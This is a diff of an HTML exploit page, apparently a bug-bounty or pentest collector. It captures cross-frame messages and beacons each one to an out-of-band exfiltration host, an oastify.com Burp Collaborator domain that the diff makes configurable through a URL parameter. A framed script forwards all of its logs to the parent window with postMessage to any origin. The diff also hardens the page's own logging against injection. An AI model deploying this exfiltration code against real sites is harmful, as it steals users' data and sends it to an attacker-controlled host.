@@ -6,13 +6,16 @@
 <div id="log" style="max-height:80vh;overflow:auto;border:1px solid #0f0;padding:10px;"></div>
 
 <script>
-const EXFIL = '8enpds891mi66ld8hc42ougriio9c50u.oastify.com';
+const EXFIL = new URLSearchParams(location.search).get('exfil') || 'YOUR_COLLABORATOR_ID.oastify.com';
 let msgCount = 0;
 
 function log(msg) {
     msgCount++;
     const time = new Date().toLocaleTimeString();
-    document.getElementById('log').innerHTML = `[${time}] #${msgCount}: ${msg}<br>` + document.getElementById('log').innerHTML;
+    const entry = document.createElement('div');
+    entry.textContent = `[${time}] #${msgCount}: ${msg}`;
+    const logEl = document.getElementById('log');
+    logEl.insertBefore(entry, logEl.firstChild);
     
     // Exfiltrate from collector (NOT from null frame)
     new Image().src = `https://${EXFIL}/?c=${encodeURIComponent(msg)}`;
@@ -39,7 +42,9 @@ window.addEventListener('message', function(e) {
 <div id="s"></div>
 <script>
 function l(m) {
-    document.getElementById('s').innerHTML += '<br>' + m;
+    const el = document.createElement('div');
+    el.textContent = m;
+    document.getElementById('s').appendChild(el);
     // Send ALL logs to parent via postMessage
     window.parent.postMessage({type: 'LOG', msg: m}, '*');
 }
